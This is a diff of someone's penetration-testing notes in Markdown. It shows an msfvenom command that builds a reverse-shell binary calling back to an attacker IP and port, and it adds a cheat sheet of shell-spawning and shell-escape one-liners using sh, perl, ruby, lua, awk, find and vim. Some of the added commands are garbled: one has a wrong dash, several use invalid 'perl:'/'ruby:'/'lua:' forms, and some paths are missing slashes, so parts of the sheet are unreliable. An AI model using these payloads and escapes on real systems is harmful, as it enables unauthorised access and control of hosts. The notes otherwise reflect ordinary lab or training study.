@@ -74,4 +74,48 @@ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > cr
 `-p` -> select payload <br>
 `-f` -> format file to export<br>
 how to find what that request just go to Metasploit ,search and use `options`
+## Spawning Interactive Shells
+#### Interactive
+```shell
+/bin/sh -i
+```
+#### Prel
+```perl
+perl —e 'exec "/bin/sh";'
+```
 
+```perl
+perl: exec "bin/bash";
+```
+#### Ruby
+```ruby
+ruby: exec "bin/bash";
+```
+#### Lua
+```lua
+lua: os.execute('bin/bash')
+```
+#### AWK
+```c
+awk 'BEGIN {system("/bin/sh")}'
+```
+#### Find
+##### Using Find For A Shell
+```shell
+find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+```
+##### Using Exec To Launch A Shell
+```shell
+find . -exec /bin/sh \; -quit
+```
+#### VIM
+##### Vim to shell
+```shell
+vim -c ':!/bin/sh'
+```
+##### Vim to exec shell
+```shell
+vim
+:set shell=/bin/sh
+:shell
+```
